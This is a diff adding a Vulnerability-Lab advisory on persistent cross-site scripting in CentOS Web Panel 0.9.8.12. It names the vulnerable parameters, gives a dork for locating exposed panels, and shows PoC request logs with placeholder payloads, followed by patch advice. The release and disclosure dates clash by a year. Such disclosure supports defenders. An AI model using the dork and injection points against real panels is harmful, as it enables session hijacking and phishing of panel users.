@@ -1,0 +1,231 @@
+Document Title:
+===============
+CentOS Web Panel v0.9.8.12 - Multiple Persistent Web Vulnerabilities
+
+
+References (Source):
+====================
+http://www.vulnerability-lab.com/get_content.php?id=1836
+
+
+Release Date:
+=============
+2018-01-19
+
+
+Vulnerability Laboratory ID (VL-ID):
+====================================
+1836
+
+
+Common Vulnerability Scoring System:
+====================================
+4.4
+
+
+Vulnerability Class:
+====================
+Cross Site Scripting - Persistent
+
+
+Current Estimated Price:
+========================
+1.000€ - 2.000€
+
+
+Product & Service Introduction:
+===============================
+CentOS Web Panel - Free Web Hosting control panel is designed for quick and easy management of (Dedicated & VPS) servers without of 
+need to use ssh console for every little thing. There is lot's of options and features for server management in this control panel.
+CWP automatically installs full LAMP on your server (apache,php, phpmyadmin, webmail, mailserver…).
+
+(Copy of the Homepage: http://centos-webpanel.com/features )
+
+
+Abstract Advisory Information:
+==============================
+The vulnerability laboratory core research team discovered multiple persistent web vulnerabilities in the official CentOS Web Panel v0.9.8.12.
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2017-01-19: Public Disclosure (Vulnerability Laboratory)
+
+
+Discovery Status:
+=================
+Published
+
+
+Affected Product(s):
+====================
+CWP
+Product: CentOS Web Panel - (CWP) 0.9.8.12
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===============
+Medium
+
+
+Technical Details & Description:
+================================
+Multiple persistent validation web vulnerabilities has been discovered in the official CentOS Web Panel v0.9.8.12.
+The vulnerability allows remote attackers to inject own malicious script codes to the application-side of the 
+affected vulnerable modules.
+
+The vulnerabilities are located in the `id` and `email_address` parameters of the `index.php` file POST method request. 
+Remote attackers are able to inject script code to the POST method request to manipulate the item listing output context. 
+The request method to inject is POST and the attack vector is persistent on the application-side. The injection points are 
+the both add POST method requests and the execution point occurs in the output location of both modules.
+
+The security risk of the web vulnerabilities are estimated as medium with a cvss (common vulnerability scoring system) count of 4.4. 
+Exploitation of the persistent web vulnerabilities requires a low privileged web-application user account and low user interaction. 
+Successful exploitation of the vulnerabilities results in session hijacking, persistent phishing attacks, persistent external redirects 
+to malicious source and persistent manipulation of affected or connected application modules.
+
+Request Method(s):
+[+] POST
+
+Vulnerable Module(s):
+[+] phpini_editor
+[+] mail_add-new
+				
+Vulnerable File(s):
+[+] index.php
+
+Vulnerable Parameter(s):
+[+] id
+[+] email_address
+
+
+Proof of Concept (PoC):
+=======================
+The web vulnerabilities can be exploited by remote attackers with low privileged user account and low user interaction.
+For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.
+
+
+Dork(s):
+"powered by CentOS-WebPanel.com"
+
+
+--- PoC Session Logs [POST] ---
+Status: 200[OK]
+POST http://localhost:2030/index.php?module=phpini_editor 
+Mime Type[text/html]
+   Request Header:
+      Host[localhost:2030]
+      User-Agent[Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0]
+      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
+      Referer[http://localhost:2030/index.php?module=phpini_editor]
+      Cookie[cwpsrv-3cc0cea69668d490e1029c2a41ce5df3=8fnvi0bqgjj162mqklruu8clq5; PHPSESSID=8dsrha0ivd80kkgukvklgvmct1]
+      Connection[keep-alive]
+   POST-Daten:
+      id[%3E%22%3CPAYLOAD INJECTION POINT!+src]
+      del[]
+   Response Header:
+      Server[Apache/2.2.27 (Unix) mod_ssl/2.2.27 OpenSSL/1.0.1e-fips PHP/5.4.27]
+      X-Powered-By[PHP/5.4.27]
+      Keep-Alive[timeout=5, max=94]
+      Connection[Keep-Alive]
+      Transfer-Encoding[chunked]
+      Content-Type[text/html]
+
+PoC: POST via Delete function in phpini_editor via Add your custom settings! input
+<div class="row">
+<h3>Simple php.ini editor</h3>
+File Location: /home/test-dom/public_html/php.ini
+<br><br>magic_quotes_gpc=>"<%3E%22%3CPERSISTENT SCRIPT CODE PAYLOAD EXECUTION!+src>
+ Removed!<META HTTP-EQUIV='refresh' CONTENT='1'>	
+                </div><!-- End .row -->
+            </div><!-- End contentwrapper -->
+        </div><!-- End #content -->
+    </div><!-- End #wrapper -->
+
+Reference(s):
+http://localhost:2030/index.php?module=phpini_editor 
+
+
+
+--- PoC Session Logs [POST] ---
+Status: 200[OK]
+POST http://localhost:2030/index.php?module=mail_add-new 
+Mime Type[text/html]
+   Request Header:
+      Host[localhost:2030]
+      User-Agent[Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0]
+      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
+      Referer[http://localhost:2030/index.php?module=mail_add-new]
+      Cookie[cwpsrv-3cc0cea69668d490e1029c2a41ce5df3=8fnvi0bqgjj162mqklruu8clq5; PHPSESSID=8dsrha0ivd80kkgukvklgvmct1]
+      Connection[keep-alive]
+   POST-Daten:
+      ifpost[yes]
+      email_address[%3E%22%3CPAYLOAD INJECTION POINT!+src]
+      domain[test-domain.com]
+      password[%3E%22%3CPAYLOAD INJECTION POINT!+src]
+   Response Header:
+      Server[Apache/2.2.27 (Unix) mod_ssl/2.2.27 OpenSSL/1.0.1e-fips PHP/5.4.27]
+      X-Powered-By[PHP/5.4.27]
+      Keep-Alive[timeout=5, max=100]
+      Connection[Keep-Alive]
+      Transfer-Encoding[chunked]
+      Content-Type[text/html]
+
+
+PoC: POST via add Mailbox in email input 
+<div class="row">
+<br>Email domain <b>test-domain.com</b> created.
+<br>Mailbox <b>a>"<%3E%22%3CPERSISTENT SCRIPT CODE PAYLOAD EXECUTION!+src>@test-domain.com</b> created.
+<br><h3>Create a New Email Account or Forwarder (MailBox/Forwarder)</h3>
+Here you can create a new email account or forwarder.
+<br><br>
+<div class='row'>
+	<div class='col-lg-8'>
+		<div class='panel panel-default chart gradient'>
+        <div class='panel-heading'>
+			<h4><span class='icon16 icomoon-icon-bars'></span>
+				<span>Create a New Email Account (MailBox)</span>
+			</h4>
+        <a href='#' class='minimize'>Minimize</a>
+        </div>
+        <div class='panel-body' style='padding-bottom:0;'>
+<form action='' method= 'post'>
+<input type='hidden' name='ifpost' size='0' value='yes'>
+<table><tr><td>
+
+Reference(s):
+http://localhost:2030/index.php?module=mail_add-new 
+
+
+Solution - Fix & Patch:
+=======================
+The vulnerabilities can be patched by a sanitize in the vulnerable `id` and `email address` parameters of the index.php file POST method request. 
+Disallow usage of special chars and restrict the parameter input to prevent script code injection attacks. Filter in the output error location 
+or the item listing the vulnerable location were the code point occurs.
+
+
+Security Risk:
+==============
+The security risk of the application-side input validation vulnerabilities in the web-application are estimated as medium. (CVSS 4.4)
+
+
+Credits & Authors:
+==================
+Benjamin K.M. [bkm@vulnerability-lab.com] - https://www.vulnerability-lab.com/show.php?user=Benjamin+K.M.
+
+
+Disclaimer & Information:
+=========================
+The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed or 
+implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable in any 
+case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability Labs or its 
+suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability mainly for incidental
+or consequential damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any licenses, policies, deface 
+websites, hack into databases or trade with stolen data. We have no need for criminal activities or membership requests. We do not publish advisories 
+or vulnerabilities of religious-, militant- and racist- hacker/analyst/researcher groups or individuals. We do not publish trade researcher mails, 
+phone numbers, conversations or anything else to journalists, investigative authorities or private individuals.
